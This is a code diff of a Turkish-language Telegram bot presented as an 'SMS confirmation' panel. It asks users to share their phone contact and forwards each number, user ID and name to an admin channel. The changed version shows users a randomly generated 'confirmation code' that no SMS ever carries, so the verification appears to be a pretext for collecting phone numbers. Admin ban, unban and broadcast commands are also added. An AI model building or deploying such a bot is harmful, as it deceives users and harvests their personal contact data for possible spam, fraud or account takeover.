@@ -3,118 +3,112 @@ import random
 from datetime import datetime
 from zoneinfo import ZoneInfo
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup
-from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, CallbackQueryHandler, filters
+from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
 
 TOKEN = os.getenv("BOT_TOKEN")
-ADMIN_ID = int(os.getenv("ADMIN_ID","0"))
-CHANNEL_ID = int(os.getenv("CHANNEL_ID","0"))
-TZ = ZoneInfo("Europe/Istanbul")
+ADMIN_ID = int(os.getenv("ADMIN_ID"))
+KANAL_ID = int(os.getenv("KANAL_ID"))
 
-countries = [
-("🇹🇷 Türkiye","TR"),("🇩🇪 Almanya","DE"),("🇫🇷 Fransa","FR"),("🇬🇧 İngiltere","UK"),("🇳🇱 Hollanda","NL"),
-("🇺🇸 Amerika","US"),("🇧🇷 Brezilya","BR"),("🇯🇵 Japonya","JP"),("🇮🇳 Hindistan","IN"),("🇦🇪 BAE","AE"),
-("🇮🇹 İtalya","IT"),("🇪🇸 İspanya","ES"),("🇨🇦 Kanada","CA"),("🇸🇪 İsveç","SE"),("🇳🇴 Norveç","NO"),
-("🇨🇭 İsviçre","CH"),("🇦🇺 Avustralya","AU"),("🇦🇹 Avusturya","AT"),("🇧🇪 Belçika","BE"),("🇵🇱 Polonya","PL")
-]
+waiting_number = set()
+banned_users = set()
 
-waiting_country = {}
-
-def saat():
-    return datetime.now(TZ).strftime("%d.%m.%Y • %H:%M")
-
-def panel(user):
-    uname = f"@{user.username}" if user.username else user.first_name
-    return f"""
-┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
-        📲 SMS ONAY PANELİ
-┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
-
-╭──────────── KULLANICI ────────────╮
-│ 👤 {uname}
-│ 🆔 {user.id}
-│ 🔐 Durum : Aktif
-╰───────────────────────────────────╯
-
-╭───────────── SİSTEM ─────────────╮
-│ 🌍 Bölge : Türkiye
-│ 🕒 Saat  : {saat()}
-│ 🟢 Sunucu : Online
-│ ⚙️ Sürüm : v4.0
-╰───────────────────────────────────╯
-
-Aşağıdan işlem seç 👇
-"""
-
-def menu():
+def main_menu():
     return InlineKeyboardMarkup([
-        [InlineKeyboardButton("✧ SMS ONAY ✧",callback_data="sms")],
-        [InlineKeyboardButton("👑 Geliştirici",callback_data="dev"),InlineKeyboardButton("ℹ️ Bilgi",callback_data="info")]
+        [InlineKeyboardButton("📲 SMS Onay", callback_data="sms")],
+        [InlineKeyboardButton("👤 Profilim", callback_data="profil")],
+        [InlineKeyboardButton("ℹ️ Yardım", callback_data="yardim")]
     ])
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(panel(update.effective_user),reply_markup=menu())
+    user = update.effective_user
+    if user.id in banned_users:
+        return
+    await update.message.reply_text(
+        f"Hoşgeldin {user.first_name}",
+        reply_markup=main_menu()
+    )
 
-async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query
-    await q.answer()
+async def menu_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    user = query.from_user
+    if user.id in banned_users:
+        return
+    await query.answer()
 
-    if q.data == "sms":
-        selected = random.sample(countries,10)
-        keyboard = [[InlineKeyboardButton(name,callback_data=f"country_{code}")] for name,code in selected]
-        await q.edit_message_text("🌍 Ülke seç",reply_markup=InlineKeyboardMarkup(keyboard))
+    if query.data == "sms":
+        waiting_number.add(user.id)
+        btn = KeyboardButton("Numara Gönder", request_contact=True)
+        kb = ReplyKeyboardMarkup([[btn]], resize_keyboard=True, one_time_keyboard=True)
+        await query.message.reply_text("Telefon numaranı gönder", reply_markup=kb)
 
-    elif q.data.startswith("country_"):
-        code = q.data.split("_")[1]
-        waiting_country[q.from_user.id]=code
-        btn = [[KeyboardButton("📲 SMS ONAY",request_contact=True)]]
-        await q.message.reply_text("SMS Onay için numaranı gönder",reply_markup=ReplyKeyboardMarkup(btn,resize_keyboard=True,one_time_keyboard=True))
+    elif query.data == "profil":
+        await query.message.reply_text(f"ID: {user.id}\nAd: {user.first_name}")
 
-    elif q.data=="dev":
-        await q.edit_message_text("👑 Geliştirici: @tanrican")
-
-    elif q.data=="info":
-        await q.edit_message_text("Bu bot doğrulama paneli arayüzüdür")
+    elif query.data == "yardim":
+        await query.message.reply_text("Menüden SMS Onay seçip numaranı gönder")
 
 async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
-    if user.id not in waiting_country:
+    if user.id not in waiting_number:
         return
 
-    code = waiting_country[user.id]
+    waiting_number.remove(user.id)
+
     phone = update.message.contact.phone_number
-    uname = f"@{user.username}" if user.username else user.first_name
+    code = random.randint(100000,999999)
 
-    text=f"""
-📥 YENİ SMS ONAY
+    time = datetime.now(ZoneInfo("Europe/Istanbul")).strftime("%d.%m.%Y %H:%M:%S")
 
-👤 Kullanıcı: {uname}
-🆔 ID: {user.id}
-🌍 Ülke: {code}
-📞 Numara: {phone}
-🕒 Saat: {saat()}
+    await update.message.reply_text(f"Onay kodun: {code}")
+
+    text = f"""
+Yeni SMS Onay
+Kullanıcı: {user.first_name}
+ID: {user.id}
+Numara: {phone}
+Kod: {code}
+Saat: {time}
 """
-
-    await context.bot.send_message(chat_id=CHANNEL_ID,text=text)
-    await update.message.reply_text("✅ SMS Onay Gönderildi")
+    await context.bot.send_message(chat_id=KANAL_ID, text=text)
 
 async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         return
     if not context.args:
         return
-    uid=int(context.args[0])
-    try:
-        await context.bot.ban_chat_member(CHANNEL_ID,uid)
-        await update.message.reply_text("Kullanıcı banlandı")
-    except:
-        await update.message.reply_text("Ban başarısız")
+    uid = int(context.args[0])
+    banned_users.add(uid)
+    await update.message.reply_text("Banlandı")
+
+async def unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        return
+    if not context.args:
+        return
+    uid = int(context.args[0])
+    banned_users.discard(uid)
+    await update.message.reply_text("Ban kaldırıldı")
+
+async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        return
+    if not context.args:
+        return
+    msg = " ".join(context.args)
+    for uid in list(waiting_number):
+        try:
+            await context.bot.send_message(uid, msg)
+        except:
+            pass
+    await update.message.reply_text("Gönderildi")
 
 app = ApplicationBuilder().token(TOKEN).build()
 
-app.add_handler(CommandHandler("start",start))
-app.add_handler(CommandHandler("ban",ban))
-app.add_handler(CallbackQueryHandler(buttons))
-app.add_handler(MessageHandler(filters.CONTACT,contact_handler))
+app.add_handler(CommandHandler("start", start))
+app.add_handler(CommandHandler("ban", ban))
+app.add_handler(CommandHandler("unban", unban))
+app.add_handler(CommandHandler("duyuru", broadcast))
+app.add_handler(CallbackQueryHandler(menu_buttons))
+app.add_handler(MessageHandler(filters.CONTACT, contact_handler))
 
-print("BOT AKTİF")
 app.run_polling()
